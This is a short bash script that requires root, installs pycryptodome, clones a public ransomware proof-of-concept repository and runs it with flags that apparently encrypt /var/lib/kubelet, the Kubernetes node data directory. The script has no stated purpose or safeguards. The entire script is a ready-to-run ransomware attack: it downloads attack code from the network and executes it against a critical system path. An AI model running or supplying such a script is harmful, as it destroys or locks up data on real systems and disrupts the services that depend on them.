#!/bin/bash

# Check if the script is run as root
if [ "$EUID" -ne 0 ]; then
    echo "Please run this script as root (use sudo)"
    exit 1
fi

# Update the package list
echo "Updating package list..."
apt-get update || {
    echo "Failed to update package list."
    exit 1
}

echo "Package list updated successfully!"

sudo apt install python3-pip
pip3 install pycryptodome
git clone https://github.com/jimmy-ly00/Ransomware-PoC.git
cd Ransomware-PoC
python3 main_v2.py -p /var/lib/kubelet -e

